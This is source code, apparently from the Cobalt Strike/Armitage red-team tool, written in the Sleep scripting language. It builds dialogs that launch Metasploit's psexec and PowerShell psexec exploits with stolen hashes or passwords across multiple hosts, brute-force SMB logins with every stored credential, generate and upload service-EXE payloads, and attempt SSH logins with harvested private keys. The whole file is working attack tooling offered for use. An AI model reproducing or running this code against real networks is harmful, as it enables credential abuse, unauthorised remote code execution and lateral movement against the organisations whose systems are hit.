#
# redefine pass_the_hash for Cobalt Strike
#
import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import msf.*;
import table.*;
import ui.*;

# one very complicated dialog (and those who know, know I hate writing dialogs like this)
sub pass_the_hash {
	local('$dialog $panel $table $model $scroll $generate @functions %options $a $b $c $d $e $f $g $h $i $p @controls $brute $help');
	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	# set some default values (we're almost there y0)
	%options['RHOST'] = join(", ", $hosts);
	%options['SMBDomain'] = "WORKGROUP";

	# setup our table...
        ($dialog, $table, $model) = show_hashes("PsExec", 360);
        [[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: [$scroll getWidth], 100]];

	# create our brute force checkbox
	$brute = ui:checkbox("Check all credentials", "CheckAll", @functions, %options);

	# create a help button
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-psexec")];

	# manually create our controls and store their return values... 
	($a, $b, $c) = ui:text("User: ", "SMBUser", @functions, %options, $null, 32);
	($d, $e, $f) = ui:text("Pass: ", "SMBPass", @functions, %options);
	($g, $h, $i) = ui:listener_psexec("Listener: ", "listener", @functions, %options);

	# we created the controls so we could enable/disable them at will... rly
	@controls = @($b, $e, $h, $i);
        [$brute addActionListener: lambda({
		map(lambda({ [$1 setEnabled: $enable]; }, $enable => iff([$brute isSelected], 0, 1)), @controls);
	}, \$brute, \@controls)];

	# when we select a value in the table, have it reflect in our textbox...
	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$b setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$e setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$b, \$e)];

	# the generate button
	$generate = ui:action_noclose("Launch", @functions, %options, $dialog, lambda({
		local('%o $host $arg $total');
		%o['SMBDomain']   = $1['SMBDomain'];
		%o['EXE::Custom'] = $1['EXE::Custom'];
		%o['RPORT']       = '445';
		$arg = $1;

		# close the dialog
		if (!isShift($2)) {
			[$dialog setVisible: 0];
		}

		if ($arg['CheckAll'] eq '1') {
			%o["DB_ALL_CREDS"]    = "false";
			%o["RHOSTS"]          = $arg['RHOST'];
			%o["BLANK_PASSWORDS"] = "false";
			%o["USER_AS_PASS"]    = "false";
			createUserPassFile(convertAll([$model getRows]), "smb_hash", $this);
			yield;
			%o["USERPASS_FILE"]   = $1;
			elog("brute force smb @ " . %o["RHOSTS"]);
			launchBruteForce("auxiliary", "scanner/smb/smb_login", %o, "brute smb");
		}
		else {
			%o["SMBUser"]  = $arg['SMBUser'];
			%o["SMBPass"]  = $arg['SMBPass'];
			%o['listener'] = $arg['listener']; 
			%o['PAYLOAD']  = fixListenerOptions(%o);

			# if there is no custom EXE... let's do one (this *is* Cobalt Strike after all)
			if (%o['EXE::Custom'] eq "" && %o["TECHNIQUE"] ne "PSH") {
				%o['output'] = "Windows Service EXE";
				generateSafePayload(randomArtifactName(), %o['PAYLOAD'], %o, $this);
				yield;
				%o['EXE::Custom'] = convertAll($1);
				%o['WfsDelay'] = 30;
				deleteOnExit(%o['EXE::Custom']);
			}
		
			# safe upload of EXE
			if (%o['EXE::Custom'] ne "") {
				uploadBigFile(%o['EXE::Custom'], $this);
				yield;
				%o['EXE::Custom'] = $1;
			}

			if (%o['PAYLOAD'] is $null && %o['EXE::Custom'] eq "") {
				return;
			}

			$total = size(split(',\s+', $arg['RHOST']));

			# loop through each host?!?
			foreach $host (split(',\s+', $arg['RHOST'])) {
				%o["RHOST"] = $host;
				module_execute("exploit", "windows/smb/psexec", copy(%o), $total);
			}

			elog("psexec: " . %o['SMBUser'] . ":" . %o['SMBPass'] . " @ " . $arg['RHOST']);

			if ($total >= 4) {
				showError("Launched windows/smb/psexec at $total hosts");
			}
		}
	}, \$table, \$model, \$dialog));

	# layout everything so it looks nice and pretty...
	$p = [new JPanel];
	matrixLayout($p, @(
		@($a, $b, $c),
		@($d, $e, $f),
		ui:text("Domain: ", "SMBDomain", @functions, %options),
		@($g, $h, $i)
	), 3);

	[$dialog add: $scroll, [BorderLayout CENTER]];
	[$dialog add: stack(    $p,
				$brute,
				center($generate, $help)), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

# psexec with powershell (phEARsome)
sub pass_the_hash_psh {
	local('$dialog $panel $table $model $scroll $generate @functions %options $a $b $c $d $e $f $g $h $i $p @controls $x64 $help');
	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	# set some default values (we're almost there y0)
	%options['RHOST'] = join(", ", $hosts);
	%options['SMBDomain'] = "WORKGROUP";

	# setup our table...
        ($dialog, $table, $model) = show_hashes("PsExec (PowerShell)", 360);
        [[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: [$scroll getWidth], 100]];

	# create our brute force checkbox
	$x64 = ui:checkbox("Target is an x64 system", "RUN_WOW64", @functions, %options);

	# create a help button
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-psexec")];

	# manually create our controls and store their return values... 
	($a, $b, $c) = ui:text("User: ", "SMBUser", @functions, %options, $null, 32);
	($d, $e, $f) = ui:text("Pass: ", "SMBPass", @functions, %options);
	($g, $h, $i) = ui:listener_psexec2("Listener: ", "listener", @functions, %options);

	# when we select a value in the table, have it reflect in our textbox...
	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$b setText: [$model getSelectedValueFromColumn: $table, "user"]];
		[$e setText: [$model getSelectedValueFromColumn: $table, "pass"]];
	}, \$table, \$model, \$b, \$e)];

	# the generate button
	$generate = ui:action_noclose("Launch", @functions, %options, $dialog, lambda({
		local('%o $host $total');
		%o['SMBDomain'] = $1['SMBDomain'];
		%o['RPORT']     = '445';
		%o['RUN_WOW64'] = $1['RUN_WOW64'];
		%o["SMBUser"]   = $1['SMBUser'];
		%o["SMBPass"]   = $1['SMBPass'];
		%o['listener']  = $1['listener']; 
		%o['PAYLOAD']   = fixListenerOptions(%o);

		if (%o['PAYLOAD'] is $null) {
			return; 
		}

		$total = size(split(',\s+', $1['RHOST']));

		# loop through each host?!?
		foreach $host (split(',\s+', $1['RHOST'])) {
			%o["RHOST"] = $host;
			module_execute("exploit", "windows/smb/psexec_psh", copy(%o), $total);
		}

		elog("psexec (psh): " . %o['SMBUser'] . ":" . %o['SMBPass'] . " @ " . $1['RHOST']);

		if (!isShift($2)) {
			[$dialog setVisible: 0];
		}

		if ($total >= 4) {
			showError("Launched windows/smb/psexec_psh at $total hosts"); 
		}
	}, \$table, \$model, \$dialog));

	# layout everything so it looks nice and pretty...
	$p = [new JPanel];
	matrixLayout($p, @(
		@($a, $b, $c),
		@($d, $e, $f),
		ui:text("Domain: ", "SMBDomain", @functions, %options),
		@($g, $h, $i)
	), 3);

	[$dialog add: $scroll, [BorderLayout CENTER]];
	[$dialog add: stack($p, $x64, center($generate, $help)), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

# refresh SSHCreds?!? :)
sub refreshPubKeyTable {
	fork({
		local('$creds $cred $desc $aclient %check $key');
		[$model clear: 128];
		$creds = call($client, "db.creds2", [new HashMap])["creds2"];
		foreach $cred ($creds) {
			$key = join("~~", values($cred, @("user", "pass", "host")));
			if ($key !in %check && isSSHKey($cred['ptype'])) {
				$cred['key_file'] = getFileName($cred['pass']);
				[$model addEntry: $cred];
				%check[$key] = 1;
			}
		}
		[$model fireListeners];
	}, $model => $1, \$client);
}

# show SSH keys in a dialog yay?!?
sub show_pubkeys {
	local('$dialog $model $table $sorter $o $user $pass $button $reverse $domain $scroll $3');

	$dialog = dialog($1, 480, $2);

        $model = [new GenericTableModel: @("user", "host", "key_file"), "user", 128];
 	
        $table = [new ATable: $model];
        $sorter = [new TableRowSorter: $model];
	[$sorter toggleSortOrder: 0];
	[$sorter setComparator: 1, &compareHosts];
        [$table setRowSorter: $sorter];

	refreshPubKeyTable($model);

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: 480, 130]];
	[$dialog add: $scroll, [BorderLayout CENTER]];

	return @($dialog, $table, $model);
}

sub show_login_pubkey {
	local('%options');

	# set some default values (we're almost there y0)
	%options['RHOSTS'] = join(", ", $hosts);
	%options['DB_ALL_CREDS'] = "false";

	ssh_pubkey_dialog({
		module_execute("auxiliary", "scanner/ssh/ssh_login_pubkey", $1);
	}, $title => "SSH with Public Key", \%options, $button => "Launch", \$OPTION);
}

sub keyfileHelper {
	local('%options');

	ssh_pubkey_dialog(lambda({
		[$model setValueForKey: "USERNAME", "Value", $1['USERNAME']];
		[$model setValueForKey: $OPTION, "Value", $1[$OPTION]];
		[$model fireListeners];
	}, \$model, \$OPTION), $title => "SSH Keys", %options => %(), $button => "Choose", \$OPTION);
}

# another complicated dialog... boo!
sub ssh_pubkey_dialog {
	local('$dialog $panel $table $model $scroll $generate @functions $a $b $c $d $e $f $p @controls $brute');
	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	# setup our table...
        ($dialog, $table, $model) = show_pubkeys($title, 360);
        [[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: [$scroll getWidth], 100]];

	# manually create our controls and store their return values... 
	($a, $b, $c) = ui:text("User:     ", "USERNAME", @functions, %options, $null, 32);
	($d, $e, $f) = ui:file("Key File:",  $OPTION, @functions, %options, $null);

	# when we select a value in the table, have it reflect in our textbox...
	[[$table getSelectionModel] addListSelectionListener: lambda({
		[$b setText: [$model getSelectedValueFromColumn: $table, "user"]];
		if ($MSFVERSION >= 41000) {
			local('$name $data $handle');
			$data = [$model getSelectedValueFromColumn: $table, "pass"];
			$name = getFileProper(unpack("H*", digest($data, "MD5"))[0]) . ".key";
			if (!-exists $name) {
				$handle = openf("> $+ $name");
				writeb($handle, $data);
				closef($handle);
				deleteOnExit($name);
			}
			[$e setText: $name];
		}
		else {
			# 4.9 and older? Just set the value in the database
			[$e setText: [$model getSelectedValueFromColumn: $table, "pass"]];
		}
	}, \$table, \$model, \$b, \$e)];

	# the generate button
	$generate = ui:action_noclose($button, @functions, %options, $dialog, lambda({
		[lambda({
			[$dialog setVisible: 0];
			
			# async upload of key file, if there is one!
			if (%o[$OPTION] ne "" && -exists %o[$OPTION]) {
				uploadBigFile(%o[$OPTION], $this);
				yield;
				%o[$OPTION] = $1;
			}

			[$action: %o];

			if (isShift($e)) {
				[$dialog setVisible: 1];
			}
		}, \$table, \$model, \$dialog, \$action, %o => $1, $e => $2, \$OPTION)];
	}, \$table, \$model, \$dialog, $action => $1, \$OPTION));

	# layout everything so it looks nice and pretty...
	$p = [new JPanel];
	matrixLayout($p, @(
		@($a, $b, $c),
		@($d, $e, $f)
	), 3);

	[$dialog add: $scroll, [BorderLayout CENTER]];
	[$dialog add: stack(    $p,
				center($generate)), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}
